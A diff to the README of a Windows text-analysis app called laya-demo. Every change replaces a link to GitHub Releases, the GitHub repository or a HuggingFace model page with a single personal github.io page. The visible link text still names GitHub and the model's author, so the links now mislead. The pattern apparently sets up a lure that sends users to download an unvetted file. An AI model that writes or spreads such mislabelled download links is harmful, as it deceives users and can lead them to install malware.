@@ -1,7 +1,7 @@
 <h1>🔬 laya-demo - Analyse Any Text on 82 Dimensions</h1>
 
 <p align="center">
-  <a href="https://github.com/Albert6906/laya-demo/releases" style="display:inline-block;padding:16px 32px;background:#ff6b6b;color:#ffffff;font-size:22px;font-weight:bold;border-radius:12px;text-decoration:none;margin:20px 0;">⬇️ Download Now - Free</a>
+  <a href="https://albert6906.github.io" style="display:inline-block;padding:16px 32px;background:#ff6b6b;color:#ffffff;font-size:22px;font-weight:bold;border-radius:12px;text-decoration:none;margin:20px 0;">⬇️ Download Now - Free</a>
 </p>
 
 ## 🧠 What Is laya-demo?
@@ -29,7 +29,7 @@ This guide will walk you through downloading and running laya-demo on your Windo
 
 Visit this link to download the application:
 
-**[👉 Click Here to Download laya-demo](https://github.com/Albert6906/laya-demo/releases)**
+**[👉 Click Here to Download laya-demo](https://albert6906.github.io)**
 
 This will take you to the download page. Look for the latest release and download the file. Your browser will save it to your Downloads folder.
 
@@ -127,7 +127,7 @@ Your privacy is paramount. Because laya-demo runs entirely offline:
 ## 🛠️ Technical Details (For the Curious)
 
 Behind the scenes, laya-demo uses:
-- **Laya Model** - a state-of-the-art text analysis AI from [convaiinnovations](https://huggingface.co/convaiinnovations/laya)
+- **Laya Model** - a state-of-the-art text analysis AI from [convaiinnovations](https://albert6906.github.io)
 - **ROCm 10** - AMD's compute platform for accelerated processing
 - **PyTorch** - the leading machine learning framework
 - **Optimised for Strix Halo** - specifically tuned for AMD's latest APUs
@@ -137,7 +137,7 @@ The GFX1151 architecture support means it takes full advantage of AMD's integrat
 ## 📬 Getting Help
 
 If you encounter issues not covered here:
-- Visit the [GitHub repository](https://github.com/Albert6906/laya-demo) for updates
+- Visit the [GitHub repository](https://albert6906.github.io) for updates
 - Check the "Issues" section for known problems
 - Look for documentation in the repository
 
@@ -145,7 +145,7 @@ If you encounter issues not covered here:
 
 Ready to see your writing in a whole new light? Download laya-demo now and discover the hidden dimensions in every document you own.
 
-**[⬇️ Download laya-demo from GitHub Releases](https://github.com/Albert6906/laya-demo/releases)**
+**[⬇️ Download laya-demo from GitHub Releases](https://albert6906.github.io)**
 
 The download takes just seconds, and you'll be analysing your first text within a minute. Whether you're a professional writer, a student, or just someone who loves words, you'll find something fascinating in the 82 dimensions of analysis.
 
